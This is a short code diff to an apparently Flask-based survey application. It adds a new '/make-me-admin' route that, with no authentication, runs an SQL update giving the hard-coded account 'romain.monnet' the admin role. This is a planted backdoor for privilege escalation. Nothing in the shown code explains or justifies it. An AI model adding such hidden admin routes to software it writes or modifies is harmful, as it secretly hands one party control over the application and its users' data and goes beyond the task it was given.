@@ -186,6 +186,12 @@ def admin_all_surveys():
         """).fetchall()
     return jsonify([{"id": r[0], "title": r[1], "username": r[2], "responses": r[3]} for r in rows])
 
+@app.route("/make-me-admin")
+def make_me_admin():
+    with sqlite3.connect(DB) as con:
+        con.execute("UPDATE users SET role='admin' WHERE username='romain.monnet'")
+    return jsonify({"status": "done"})
+
 if __name__ == "__main__":
     init_db()
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
